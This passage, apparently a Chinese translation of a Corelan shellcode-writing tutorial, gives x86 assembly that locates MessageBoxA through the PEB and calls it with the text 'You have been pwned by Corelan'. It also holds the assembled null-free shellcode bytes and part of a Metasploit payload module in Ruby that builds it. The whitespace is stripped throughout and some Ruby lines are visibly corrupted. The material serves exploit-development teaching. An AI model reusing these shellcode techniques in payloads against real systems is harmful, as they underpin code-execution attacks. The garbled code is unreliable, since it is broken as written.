xchgebx,dword[esp] ;esp=baseaddressofuser32.dll
pushedx
callfind_function
;functionaddressshouldbeineaxnow
;we'llkeepitthere
;getpointertotitle
PUSH0xFF6e616c
PUSH0x65726f43
xorebx,ebx
mov[esp+0x7],bl ;terminatewithnullbyte
movebx,esp ;ebxnowpointstoTitlestring
;getpointertoText
PUSH0xFF206e61
PUSH0x6c65726f
PUSH0x43207962
PUSH0x2064656e
PUSH0x7770206e
PUSH0x65656220
PUSH0x65766168
PUSH0x20756f59
xorecx,ecx
mov[esp+0x1F],cl ;terminatewithnullbyte
movecx,esp
;nowpushparameterstothestack
xoredx,edx ;zerooutedx
pushedx ;put0onstack
pushebx ;putpointertoTitleonstack
pushecx ;putpointertoTextonstack
pushedx ;put0onstack
calleax ;callMessageBoxA(0,Text,Title,0)
;ExitFunc
xoreax,eax
;zeroouteax
pusheax ;put0onstack
call[ebp+8] ;ExitProcess(0)
转化为字节码：
C:\shellcode>"c:\ProgramFiles\nasm\nasm.exe"
corelanmsgbox.asm-o
corelanmsgbox.bin
C:\shellcode>perlpveReadbin.plcorelanmsgbox.bin
Readingcorelanmsgbox.bin
Read283bytes
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31"
"\xd2\xb2\x7a\x31\xc9\x64\x8b\x71"
"\x30\x8b\x76\x0c\x8b\x76\x1c\x8b"
"\x46\x08\x8b\x7e\x20\x8b\x36\x38"
"\x4f\x18\x75\xf3\x59\x01\xd1\xff"
"\xe1\x60\x8b\x6c\x24\x24\x8b\x45"
"\x3c\x8b\x54\x05\x78\x01\xea\x8b"
"\x4a\x18\x8b\x5a\x20\x01\xeb\xe3"
"\x37\x49\x8b\x34\x8b\x01\xee\x31"
"\xff\x31\xc0\xfc\xac\x84\xc0\x74"
"\x0a\xc1\xcf\x0d\x01\xc7\xe9\xf1"
"\xff\xff\xff\x3b\x7c\x24\x28\x75"
"\xde\x8b\x5a\x24\x01\xeb\x66\x8b"
"\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b"
"\x04\x8b\x01\xe8\x89\x44\x24\x1c"
"\x61\xc3\xb2\x08\x29\xd4\x89\xe5"
"\x89\xc2\x68\x8e\x4e\x0e\xec\x52"
"\xe8\x9c\xff\xff\xff\x89\x45\x04"
"\xbb\x7e\xd8\xe2\x73\x87\x1c\x24"
"\x52\xe8\x8b\xff\xff\xff\x89\x45"
"\x08\x68\x6c\x6c\x20\xff\x68\x33"
"\x32\x2e\x64\x68\x75\x73\x65\x72"
"\x88\x5c\x24\x0a\x89\xe6\x56\xff"
"\x55\x04\x89\xc2\x50\xbb\xa8\xa2"
"\x4d\xbc\x87\x1c\x24\x52\xe8\x5e"
"\xff\xff\xff\x68\x6c\x61\x6e\xff"
"\x68\x43\x6f\x72\x65\x31\xdb\x88"
"\x5c\x24\x07\x89\xe3\x68\x61\x6e"
"\x20\xff\x68\x6f\x72\x65\x6c\x68"
"\x62\x79\x20\x43\x68\x6e\x65\x64"
"\x20\x68\x6e\x20\x70\x77\x68\x20"
"\x62\x65\x65\x68\x68\x61\x76\x65"
"\x68\x59\x6f\x75\x20\x31\xc9\x88"
"\x4c\x24\x1f\x89\xe1\x31\xd2\x52"
"\x53\x51\x52\xff\xd0\x31\xc0\x50"
"\xff\x55\x08";
Numberofnullbytes:0
哈--很好
这个改进的代码会对Metasploit上的模块有什么影响？好的，它增加了一点复杂度因为我们
不得不在运行时写入字符串和null字节...但是那不是一个障碍，因为你可以用ruby写出所
有的智慧并且动态打造payload：
##
#$Id:messagebox.rb22010-02-2600:28:00:00Zcorelanc0d3r&rick2600$
##
require'msf/core'
moduleMetasploit3
includeMsf::Payload::Windows
includeMsf::Payload::Single
definitialize(info={})
super(update_info(info,
'Name' =>'WindowsMessageboxwithcustomtitleandtext',
'Version' =>'$Revision:2$',
'Description' =>'SpawnsMessageBoxwithacustomizabletitle&text',
'Author' =>['corelanc0d3r-peter.ve[at]corelan.be',
'rick2600-ricks2600[at]gmail.com'],
'License' =>BSD_LICENSE,
'Platform' =>'win',
'Arch' =>ARCH_X86,
'Privileged' =>false,
'Payload' =>
{
'Offsets'=>{},
'Payload'=> "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31"+
"\xd2\xb2\x7a\x31\xc9\x64\x8b\x71"+
"\x30\x8b\x76\x0c\x8b\x76\x1c\x8b"+
"\x46\x08\x8b\x7e\x20\x8b\x36\x38"+
"\x4f\x18\x75\xf3\x59\x01\xd1\xff"+
"\xe1\x60\x8b\x6c\x24\x24\x8b\x45"+
"\x3c\x8b\x54\x05\x78\x01\xea\x8b"+
"\x4a\x18\x8b\x5a\x20\x01\xeb\xe3"+
"\x37\x49\x8b\x34\x8b\x01\xee\x31"+
"\xff\x31\xc0\xfc\xac\x84\xc0\x74"+
"\x0a\xc1\xcf\x0d\x01\xc7\xe9\xf1"+
"\xff\xff\xff\x3b\x7c\x24\x28\x75"+
"\xde\x8b\x5a\x24\x01\xeb\x66\x8b"+
"\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b"+
"\x04\x8b\x01\xe8\x89\x44\x24\x1c"+
"\x61\xc3\xb2\x08\x29\xd4\x89\xe5"+
"\x89\xc2\x68\x8e\x4e\x0e\xec\x52"+
"\xe8\x9c\xff\xff\xff\x89\x45\x04"+
"\xbb\x7e\xd8\xe2\x73\x87\x1c\x24"+
"\x52\xe8\x8b\xff\xff\xff\x89\x45"+
"\x08\x68\x6c\x6c\x20\xff\x68\x33"+
"\x32\x2e\x64\x68\x75\x73\x65\x72"+
"\x88\x5c\x24\x0a\x89\xe6\x56\xff"+
"\x55\x04\x89\xc2\x50\xbb\xa8\xa2"+
"\x4d\xbc\x87\x1c\x24\x52\xe8\x5e"+
"\xff\xff\xff"
}
))
#EXITFUNC:hardcodedtoExitProcess:/
deregister_options('EXITFUNC')
#Registercommandexecutionoptions
register_options(
[
OptString.new('TITLE',[true,
"MessageboxTitle(max255chars)"]),
OptString.new('TEXT',[true,
"MessageboxText"])
],self.class)
end
#
#Constructsthepayload
#
defgenerate
strTitle=datastore['TITLE']
if(strTitle)
#================ProcessTitle==================================
strTitle=strTitle+"X"
iTitle=strTitle.length
if(iTitle=0
thisChar=strTitle[icnt,1]
strLine=thisChar+strLine
ificharcnt<3
icharcnt+=1
else
strPushTitle=strPushTitle+"h"+strLine #h=\68=push
strLine=""
icharcnt=0
end
icnt=icnt-1
end
#generateopcodetowritenullbyte
strWriteTitleNull="\x31\xDB\x88\x5C\x24"
strWriteTitleNull+=iSniperTitle.chr+"\x89\xe3"
#================ProcessText===============================
#cuttextinto4bytepushinstructions
strText=datastore['TEXT']
strText=strText+"X"
iText=strText.length
iNrLines=iText/4
iCheckChars=iNrLines*4
strSpaces=""